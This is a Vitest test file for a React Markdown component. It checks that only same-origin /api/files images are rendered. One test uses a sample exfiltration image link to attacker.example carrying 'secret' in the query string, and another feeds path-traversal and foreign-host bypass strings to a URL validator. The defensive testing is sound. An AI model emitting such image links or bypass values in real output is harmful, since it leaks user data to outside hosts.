import { describe, expect, it } from 'vitest'
import { render, screen } from '@testing-library/react'
import { isApiFileUrl, Markdown } from './Markdown'

describe('markdown images', () => {
  it('inlines same-origin /api/files images (relative and absolute)', () => {
    render(<Markdown text={`![a](/api/files/f1/content) ![b](${window.location.origin}/api/files/f2/content)`} />)
    const srcs = screen.getAllByRole('img').map((i) => i.getAttribute('src'))
    expect(srcs).toEqual(['/api/files/f1/content', `${window.location.origin}/api/files/f2/content`])
  })

  it('renders foreign images as a plain link with the alt text and no <img>', () => {
    const { container } = render(<Markdown text="![leak](https://attacker.example/?d=secret)" />)
    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByRole('link', { name: 'leak' })
    expect(link).toHaveAttribute('href', 'https://attacker.example/?d=secret')
  })

  it('never renders data: or non-file same-origin images', () => {
    const { container } = render(<Markdown text={'![d](data:image/png;base64,AAAA) ![o](/other/x.png) ![p](/api/files/../x)'} />)
    expect(container.querySelector('img')).toBeNull()
  })

  it('isApiFileUrl rejects tricks', () => {
    expect(isApiFileUrl('/api/files/x')).toBe(true)
    expect(isApiFileUrl('//attacker.example/api/files/x')).toBe(false)
    expect(isApiFileUrl('https://attacker.example/api/files/x')).toBe(false)
    expect(isApiFileUrl('/api/filesx')).toBe(false)
    expect(isApiFileUrl('/api/files/../secret')).toBe(false)
  })
})
